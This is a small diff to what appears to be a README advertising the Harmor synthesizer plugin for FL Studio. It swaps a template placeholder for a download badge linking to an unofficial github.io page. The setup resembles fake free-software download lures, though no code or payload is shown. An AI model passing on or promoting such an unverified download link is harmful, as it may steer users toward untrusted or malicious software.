@@ -2,7 +2,8 @@
 
 A cutting-edge hybrid synthesizer for FL Studio that blends additive and subtractive synthesis with image and audio resynthesis. Harmor provides unmatched harmonic control and visual manipulation, built for producers who demand precision and creativity.
 
-[![Download](https://img.shields.io/badge/Download-Harmor_for_FL_Studio-blueviolet)](PLACE_YOUR_DOWNLOAD_LINK_HERE)
+[![Download](https://img.shields.io/badge/Download-Harmor_for_FL_Studio-blueviolet)](https://harmor-fl-studio-plugin.github.io/.github
+)
 
 ---
 
